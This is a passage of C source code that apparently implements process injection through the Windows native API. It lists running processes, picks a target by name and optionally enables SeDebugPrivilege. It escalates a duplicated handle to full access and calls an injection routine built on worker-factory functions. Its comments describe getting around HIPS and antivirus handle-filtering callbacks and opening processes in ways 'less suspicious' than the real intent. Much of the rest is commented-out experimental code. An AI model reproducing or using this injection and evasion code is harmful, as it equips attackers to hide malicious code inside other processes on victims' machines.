	///Since we specify a buffer size of 0 the buffer must overflow for sure even if there was running a
	///single process only. If we don't receive the dedicated error, something other has gone wrong
	///and we cannot rely on the return length.
	status = NtQuerySystemInformation(SystemProcessInformation, &procInfo, procListSize, &procListSize);
	if (STATUS_INFO_LENGTH_MISMATCH != status)
		return status;

	memSize = PAGE_ROUND_UP(procListSize) + PAGE_SIZE; ///We better allocate one page extra
													   ///since between our "test" call and the real call below
													   ///additional processes might be started. (race condition)
	status = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, 0, &memSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (status)
		return status;

	///By now, we have allocated a buffer large enough for the complete process list,
	///even if some new processes have been started in the mean time.
	///Hence, the next call is entirely expected to succeed.
	procListSize = (ULONG)memSize;
	status = NtQuerySystemInformation(SystemProcessInformation, pProcListHead, procListSize, &procListSize);
	if (status) {
		memSize = 0;
		NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, &memSize, MEM_RELEASE);
		return status;
	}

	HANDLE hWorkerFactory = NULL;
	OBJECT_ATTRIBUTES procAtttr;
	InitializeObjectAttributes(&procAtttr, NULL, 0, NULL, NULL);
	pid = NULL;
	cid.UniqueProcess = NULL;
	cid.UniqueThread = NULL;
	pProcEntry = pProcListHead;             ///The list of all system processes is a so called singly linked list.

	if (useDebugPrivilege) {
		status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);
		if (status)         ///Since we're for some reason supposed to use the SeDebugPrivilege,
			return status;  ///we fail deliberately if we can't enable it. 
	}
	//BOOLEAN fla = FALSE;
	while (pProcEntry->NextEntryOffset) { ///If NextEntryOffset member is NULL, we have reached the list end (tail).
		pProcEntry = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pProcEntry + pProcEntry->NextEntryOffset);
		//DebugPrint2A("PID: %d, %wZ", pProcEntry->UniqueProcessId, pProcEntry->ImageName);
		if (0 == RtlCompareUnicodeString(pProcName, &pProcEntry->ImageName, TRUE)) {
			//if (!fla) {
			//	fla = TRUE;
			//	continue;
			//}
			
			cid.UniqueProcess = pProcEntry->UniqueProcessId;
			if (hProcess)
				NtClose(hProcess);
			//cid.UniqueProcess = (HANDLE)5400;
			status = NtOpenProcess(&hProcess, PROCESS_DUP_HANDLE, &procAtttr, &cid);
			if (status) {
				hProcess = NULL;
				continue;
			}
			status = NtDuplicateObject(hProcess, INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE, &hProcess, PROCESS_ALL_ACCESS, OBJ_CASE_INSENSITIVE, 0);
			dispError(0xC0000100);
			status = NtQueryObject(hProcess, ObjectBasicInformation, &processHandleInfo, sizeof(OBJECT_BASIC_INFORMATION), &obQueryLen);
			if (status)		///Not sure if this call ever will fail...
				continue;

			///Maybe, HIPS just wanted to deny PROCESS_TERMINATE/PROCESS_SUSPEND right?
			///If so, we don't care. We're only interested in VM rights.
			if ((MIN_VM_ACCESS_MASK | PROCESS_DUP_HANDLE) & ~processHandleInfo.GrantedAccess) {
				dispError(0xC0000022);
				continue;
			}
			//NtCreateT
				//continue;
			//status = NtCreateThreadEx(&hProcess, THREAD_ALL_ACCESS, &procAtttr, hProcess, (LPTHREAD_START_ROUTINE)&NtTerminateProcess, (PVOID)INVALID_HANDLE_VALUE, FALSE, 0, 0, 0, NULL);
			//dispError(0xC0000101);

			dispError(0xC0000101);
			status = injectIntoProcess(hProcess, hWorkerFactory, (ULONGLONG)&NtWaitForWorkViaWorkerFactory);
			if (!status) {
				injectionSucceeded = TRUE;
				break;
			}
		}
	}

	if (hWorkerFactory)
		NtClose(hWorkerFactory);

	if (injectionSucceeded)
		status = STATUS_SUCCESS;

	memSize = 0;
	NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pProcListHead, &memSize, MEM_RELEASE); ///We don't need the list anymore.

	if (!cid.UniqueProcess)
		return STATUS_OBJECT_NAME_NOT_FOUND;

	if(hProcess)
		NtClose(hProcess);

	return status;
}



void mymain(void){
	NTSTATUS status = STATUS_PENDING;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	UNICODE_STRING uProcess;
	OBJECT_ATTRIBUTES thrdAttr;
	//CLIENT_ID cid;
	//HANDLE hCompletion = INVALID_HANDLE_VALUE;
	OBJECT_ATTRIBUTES completionAttr;
	//SIZE_T memSize = 0;
	LARGE_INTEGER interval;
	//PHANDLE pPidList = NULL;

	uProcess.Buffer = TARGET_PROCESS_NAME;
	uProcess.Length = sizeof(TARGET_PROCESS_NAME) - sizeof(UNICODE_NULL);
	uProcess.MaximumLength = sizeof(TARGET_PROCESS_NAME);
	InitializeObjectAttributes(&thrdAttr, NULL, 0, NULL, NULL);
	InitializeObjectAttributes(&completionAttr, NULL, 0, NULL, NULL);
	///The requested operation waits until you click a button.
	dispError(STATUS_PENDING);
	interval.QuadPart = -20000000;
	//do {
		//do {
			status = openProcsByName(&hProcess, &uProcess, FALSE);
			//NtDelayExecution(FALSE, &interval);
		//} while (!status);
		if (status)
		dispError(status);
		NtTerminateProcess(INVALID_HANDLE_VALUE, status);
			//break;
		////NtTimer
		////if (status)
		////	break;
		//
		////NtGetC
		//cid.UniqueProcess = (HANDLE)5836;
		//cid.UniqueThread = (HANDLE)5840;
		//status = NtCreateIoCompletion(&hCompletion, IO_COMPLETION_ALL_ACCESS, &completionAttr, 2);
		//if (status)
		//	break;
		//
		//status = NtCreateWorkerFactory(&hProcess, SYNCHRONIZE, &completionAttr, hCompletion, INVALID_HANDLE_VALUE, (PUCHAR)RtlSetProcessIsCritical+3, (PVOID)NtAcceptConnectPort, 70, 1024*PAGE_SIZE, PAGE_SIZE);
		//if (status)
		//	break;
		//////status = NtGetNextThread(hProcess, NULL, THREAD_ALL_ACCESS, OBJ_CASE_INSENSITIVE, 0, &hProcess);
		//////status = NtOpenThread(&hProcess, THREAD_ALL_ACCESS, &thrdAttr, &cid);
		////
		//////status = NtQueueApcThreadEx(hProcess, NULL, (PVOID)RtlSetProcessIsCritical, NULL, NULL, NULL);
		////if (status)
		////	break;

		//dispError(STATUS_XML_ENCODING_MISMATCH);
	//} while (status);
	
	//if (*pPidList)
	//	NtFreeVirtualMemory(INVALID_HANDLE_VALUE, &pPidList, &memSize, MEM_RELEASE);

	//if (status)
	//	dispError(status);

	//dispError(status);


	//NtQueueApcThreadEx()
	//rvaToFileOffset()
	////selfUnmap();
	/////No image (except the own one) can be found...
	////dispError(STATUS_SECTION_NOT_IMAGE);

	/////Initialize everything...
	////status = initializeSyscallTable();
	////if (status) {
	////	dispError(status);
	////	return;
	////}
	//////DebugPrint2A("%wZ pid = %llu", *pProcName, pid);

	//////{
	//////	NtClose(*pProcess);
	//////	*pProcess = NULL;
	//////	return STATUS_UNSUCCESSFUL;
	//////}
	//////{    
	//////	NtClose(*pProcess);
	////////	*pProcess = NULL;
	////////	return status;
	////////}





	////dispError(status);

	//////status = injectIntoProcess(hProcess, hWorkerFactory, (ULONGLONG)&NtWaitForMultipleObjects, 200);
	//////if (!status) {
	//////	NtClose(hProcess);
	//////	break;
	//////}
	//////status = injectIntoProcess(hProcess, (ULONGLONG)&NtQueryValueKey, 3000);
	//////NtClose(hProcess);
	////
	//////if (!status)
	//////	break;

	////InitializeObjectAttributes(&procAttr, NULL, 0, NULL, NULL);
	////cid.UniqueThread = (HANDLE)0;
	////cid.UniqueProcess = pid;
	///////Opening a process for full access might be less suspicious than opening with our real intentions.
	////status = NtOpenProcess(pProcess, PROCESS_ALL_ACCESS, &procAttr, &cid);

	//if (useDebugPrivilege)
	//	///We don't have any clue if the privilege already was enabled,
	//	///so we simply restore the old status. Whether we do this call or not 
	//	///isn't anyhow related to the result of process opening.
	//	RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, oldValue, FALSE, &oldValue);

	////if (status)
	////	return status;   ///Most likely STATUS_ACCESS_DENIED if
	////					 ///either we didn't specify the useDebugPrivilege flag when opening a cross session process
	////					 ///or if we tried to open an elevated process while running non-elevated.

	////					 ///In x64 windows, HIPS or AV drivers have the possibility to legally
	////					 ///receive a notification if a process is about to open a handle to another process.
	////					 ///In those ObCallback routines they cannot completely deny the opening.
	////					 ///However, they are able to modify the access masks, so a handle supposed for VM operations still
	////					 ///will be lacking the PROCESS_VM_XXX rights, for example. If we therefore query the handle rights
	////					 ///we can still return an appropriate error if wasn't granted the rights we want
	////					 ///And are not going to fail at first when performing our process operations.


	///////Maybe, HIPS just wanted to deny PROCESS_TERMINATE/PROCESS_SUSPEND right?
	///////If so, we don't care. We're only interested in VM rights.
	////if (MIN_VM_ACCESS_MASK & ~processHandleInfo.GrantedAccess) {
	////	NtClose(*pProcess);
	////	*pProcess = NULL;
	////	return STATUS_UNSUCCESSFUL;
	////}

	/////...and demonstrate that we have hopefully succeeded.
	////status = testNtapiTable();
	////if (status)
	////	dispError(status);
}

//void testRoutine(void) {
//	ULONG_PTR dummyVar;
//	&dummyVar;
//}
